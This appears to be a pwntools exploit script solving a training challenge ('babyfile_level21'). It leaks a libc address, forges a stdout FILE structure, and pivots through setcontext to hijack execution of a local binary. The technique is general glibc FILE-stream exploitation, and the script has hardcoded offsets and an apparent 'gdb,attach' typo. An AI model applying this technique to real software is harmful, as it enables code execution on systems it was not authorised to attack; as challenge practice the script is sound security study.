from pwn import *

binary = './babyfile_level21'

p = process(binary)

s = '''
b * fwrite
b * _IO_2_1_stdout_
b * puts
b * _IO_wfile_overflow
b* setcontext+61
'''

p.recvuntil("puts() within libc is: ")

puts_addr = int(p.recvline().strip(), 16)

print("puts_addr @ ", hex(puts_addr))


libc_base = puts_addr - 0x84420

stderr = libc_base + 0x4040


setcontext = puts_addr - 0x2f500 + 45
_IO_stdfile_1_lock = puts_addr + 0x16a3c0
_IO_2_1_stdout_ = puts_addr + 0x169280

writable_space = _IO_2_1_stdout_ - 0xe0

print("stderr @ ", hex(stderr))

payload = b'\x00' * 0xe0
payload += b'\x00' * 0x80
payload += p64(setcontext)
payload += p64(_IO_stdfile_1_lock + 0xe0)  # Some other field - _IO_stdfile_1_lock
payload += b'\x00' * 0x10  
payload += p64(_IO_2_1_stdout_ + 0x18)  # _wide_data

#payload += b'\x00' * (0xe0 - 0xa8 - 8)  # Rest of struct

# setting up rsp

payload += b'\x00' * 0x8
payload += b'\x00' * 0x8
payload += p64(writable_space) # rsp would be set to this
payload += b'\x00' * 0x8 # rcx would be set to this
payload += b'\x00' * 0x8
payload += b'\x00' * 0x8


payload += p64(puts_addr + 0x1649d8 - 0x38)
payload += b'\x41' * 0x18
payload += p64(_IO_2_1_stdout_)

#payload = b'A'
gdb,attach(p, s)
time.sleep(2)

p.sendline(payload)

p.interactive()
